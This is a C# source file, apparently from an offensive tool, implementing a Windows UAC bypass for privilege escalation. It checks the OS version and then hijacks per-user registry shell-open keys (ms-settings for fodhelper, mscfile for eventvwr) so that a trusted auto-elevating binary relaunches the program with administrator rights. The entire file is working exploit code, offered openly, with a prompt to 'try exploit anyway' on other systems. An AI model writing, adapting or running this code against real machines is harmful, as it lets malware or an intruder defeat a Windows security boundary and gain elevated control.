using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using Microsoft.Win32;

namespace Privilege_Escalation
{
    public static class UAC
    {
        /// <summary>
        ///     Start UAC Bypass
        /// </summary>
        public static void Start()
        {
            var osName =
                Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName", "")
                    .ToString();
            Console.WriteLine("Using: " + osName);
            if (!IsRunningAsLocalAdmin())
            {
                if (osName.StartsWith("Windows 10"))
                    BypassFodhelper();
                else if (osName.StartsWith("Windows 8"))
                    BypassEventvwr();
                else if (osName.StartsWith("Windows 7"))
                    BypassEventvwr();
                else
                    Compatibility();
            }
        }

        private static void Compatibility()
        {
            Console.WriteLine(
                "\nYour OS might not be compatible.\nAre you willing to try exploit anyway?\n\nNumpad 1: Windows 7\nNumpad 2: Windows 10");
            if (Console.ReadKey().Key == ConsoleKey.NumPad1)
                BypassEventvwr();
            else
                BypassFodhelper();
        }

        private static void BypassFodhelper()
        {
            var wow64Value = IntPtr.Zero;
            Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command");
            Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\shell\open\command", true)
                ?.SetValue("", Assembly.GetExecutingAssembly().Location);
            Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\shell\open\command", true)
                ?.SetValue("DelegateExecute", "");
            Wow64Interop.DisableWow64FSRedirection(ref wow64Value);
            try
            {
                Process.Start("fodhelper");
            }
            catch
            {
                Console.WriteLine("Please make sure you removed prefer 32-bits.");
            }
            finally
            {
                Wow64Interop.Wow64RevertWow64FsRedirection(wow64Value);
                Environment.Exit(0);
            }
        }

        private static void BypassEventvwr()
        {
            Registry.CurrentUser.CreateSubKey(@"Software\Classes\mscfile\shell\open\command");
            Registry.CurrentUser.OpenSubKey(@"Software\Classes\mscfile\shell\open\command", true)
                ?.SetValue
                    ("", Assembly.GetExecutingAssembly().Location);
            Process.Start("eventvwr");
            Environment.Exit(0);
        }

        /// <summary>
        ///     Check if application is running as admin
        /// </summary>
        public static bool IsRunningAsLocalAdmin()
        {
            var cur = WindowsIdentity.GetCurrent();
            if (cur.Groups != null)
                foreach (var role in cur.Groups)
                    if (role.IsValidTargetType(typeof(SecurityIdentifier)))
                    {
                        var sid = (SecurityIdentifier) role.Translate(typeof(SecurityIdentifier));
                        if (sid.IsWellKnown(WellKnownSidType.AccountAdministratorSid) ||
                            sid.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid)) return true;
                    }

            return false;
        }

        private static class Wow64Interop
        {
            private const string Kernel32dll = "Kernel32.Dll";

            [DllImport(Kernel32dll, EntryPoint = "Wow64DisableWow64FsRedirection")]
            public static extern bool DisableWow64FSRedirection(ref IntPtr ptr);

            [DllImport(Kernel32dll, EntryPoint = "Wow64RevertWow64FsRedirection")]
            public static extern bool Wow64RevertWow64FsRedirection(IntPtr ptr);
        }
    }
}
